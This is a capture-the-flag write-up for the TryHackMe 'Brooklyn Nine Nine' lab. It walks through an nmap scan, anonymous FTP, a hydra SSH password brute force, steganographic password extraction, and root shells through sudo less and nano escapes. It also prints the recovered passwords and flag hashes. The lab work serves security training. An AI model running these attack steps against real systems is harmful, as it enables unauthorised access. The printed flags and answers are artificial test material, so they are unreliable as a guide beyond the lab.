# [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

```
export IP=10.10.120.202
```

---

## Task 1
1. User flag

	a. Nmap scan (`nmap -sV -sC -oN nmap/initial $IP`):
	```
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.6.53.245
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 4
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
	|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
	|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	```

	b. Accessed the FTP server using the Anonymous username and no password. Retrieved the `ftp/note_to_jake.txt` file:
	```
	From Amy,

	Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
	```

	c. Gave me a hint to try brute forcing SSH using the username `jake`. So I ran the `hydra` command:
	```
	hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://$IP
	```

	d. Was able to get the username and password:
	```
	username: jake
	password: 987654321
	```

	e. SSH'd into the box with `jake:987654321` and found the user.txt flag @ `/home/holt/user.txt`:
	```
	ee11cbb19052e40b07aac0ca060c23ee
	```


2. Root flag

	a. Checked `jake`'s root privileges with `sudo -l`:
	```
	Matching Defaults entries for jake on brookly_nine_nine:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User jake may run the following commands on brookly_nine_nine:
	    (ALL) NOPASSWD: /usr/bin/less
	```

	b. Went to GTFOBins to find a privesc for `less`:
	```
	# https://gtfobins.github.io/gtfobins/less/#shell
	sudo less /etc/profile

	# Then while in less, run:
	!/bin/sh
	```

	c. Got root access! Flag found @ `/root/root.txt`:
	```
	63a9f0ea7bb98050796b649e85481845
	```


3. ALTERNATIVE ROOT ACCESS

	a. There is an image we can download from the website located at `http://$IP:80/brooklyn99.jpg`
	```
	wget http://$IP:80/brooklyn99.jpg
	```

	b. After trying a few basic steganography tactics, we realize that something is hidden in the file and we need to extract it using a password.

	c. Enter `stegcracker`.
	```
	stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
	```

	d. Found the passphrase: `admin`.

	e. Use the passphrase to extract whatever is in the `brooklyn99.jpg` image:
	```
	steghide --extract -sf brooklyn99.jpg

		Enter passphrase: admin
	```

	f. A file called `note.txt` is found and put into our directory. It has the contents:
	```
	Holts Password:
	fluffydog12@ninenine

	Enjoy!!
	```

	g. SSH into the target using the following username/password:
	```
	username: holt
	password: fluffydog12@ninenine
	```

	h. Check sudo privileges with `sudo -l`:
	```
	Matching Defaults entries for holt on brookly_nine_nine:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User holt may run the following commands on brookly_nine_nine:
	    (ALL) NOPASSWD: /bin/nano
	```

	i. GTFOBins privesc for `nano`:
	```
	# https://gtfobins.github.io/gtfobins/nano/#shell
	sudo nano
	^R^X
	reset; sh 1>&0 2>&0
	```

	j. Root access numero dos, baby! 
